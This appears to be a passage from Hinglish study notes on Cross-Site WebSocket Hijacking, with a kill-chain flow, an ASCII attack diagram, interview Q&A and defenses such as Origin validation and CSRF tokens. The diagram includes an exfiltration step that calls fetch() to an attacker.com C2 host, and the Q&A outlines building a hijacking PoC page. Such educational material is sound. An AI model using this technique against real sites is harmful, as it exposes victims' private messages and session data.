⚔️ **Attack Phase:** Exploitation
📍 **Kill Chain Position:** Weaponization -> Delivery -> Exploitation -> Action on Objectives (Exfiltration)
🔗 **This connects to:** Web Application Reconnaissance, CSRF attacks
🔄 **Flow:**

1. **Recon/Discovery:** Attacker Burp Suite ki WebSockets history mein live traffic analyze karta hai.
2. **Weaponization:** Attacker handshake HTTP request Repeater mein bhej kar spoofed `Origin` check karta hai. Vulnerability confirm hone par malicious `new WebSocket()` HTML page banata hai.
3. **Exploitation:** Victim ko page deliver hota hai. Victim ka browser authenticated request bhej kar connection establish kar leta hai (101 Switching Protocols).
4. **Post-Exploitation/Reporting:** Attacker `onmessage` ke through chat messages aur real-time data apne C2 server pe exfiltrate karta hai.

### 🎨 15. Visual Diagram (ASCII Art — Attack Flow)

```text
[ Victim's Browser ]                         [ Target Chat Server ]
   (Has Auth Cookies)                           (No Origin Validation)
          |                                            |
          |--- 1. Visits http://attacker.com/exploit ->|
          |                                            |
[ Attacker's Malicious Script Runs ]                   |
          |                                            |
          |--- 2. GET /chat (Origin: attacker.com) --->|
          |       + Cookie: session=Valid123           |
          |                                            |
          |<-- 3. 101 Switching Protocols -------------| (Connection Upgraded to WS)
          |                                            |
          |<-- 4. Server sends private chat data ------|
          |                                            |
          |--- 5. fetch(attacker.com/log?data=...) --->[ Attacker C2 Server ]
                                                           (Data Exfiltrated!)

```

### ❓ 16. Interview & Certification Exam Q&A

* **Q: CSWSH aur XSS mein kya difference hai?**
* **A:** **XSS** (Cross-Site Scripting) mein attacker target ke domain ke andar hi apna malicious JS inject karta hai. **CSWSH** mein script attacker ke apne alag domain se chalti hai, aur SOP/Origin check ki kami ka fayda utha kar target ke socket tak pahunchti hai without injecting anything into the target site.


* **Q: Agar HTTP request mein Origin header spoof ho raha hai, toh browser isse protect kyun nahi karta?**
* **A:** Jab malicious JS chalega victim ke browser mein, browser automatically HTTP request mein Origin header apne domain (attacker.com) pe set karega. Browser explicitly Origin bhejna assure karta hai, **validate** karna Server ki responsibility hai.


* **Q: Tum ek application test kar rahe ho jahan `101 Switching Protocols` response aa gaya, Origin: evil.com tha. Next step kya hona chahiye PoC ke liye?**
* **A:** Main ek external HTML page banaunga jisme JavaScript ke through `new WebSocket()` object target ko point karega. Phir main usme `onmessage` listener laga kar check karunga ki target ka server actual data bhej raha hai ya nahi.


* **Q: How can a developer fully protect their WebSockets against CSWSH?**
* **A:** Pehla, HTTP handshake handler mein `Origin` header ko strictly whitelist-based validate karna padega. Doosra, initial request payload ya handshake query parameter mein unguessable CSRF tokens implement karne honge jisse cross-domain request ban hi na sake.



### 📝 17. One-Line Memory Hook

"CSRF se sirf 'Attack' hota hai, par CSWSH (WebSocket) se 'Attack bhi hota hai aur Data wapas bhi aata hai' (Two-way heist)."
*(CSWSH = CSRF equivalent for WebSockets, exploiting 101 Switching Protocols with spoofed Origin header).*
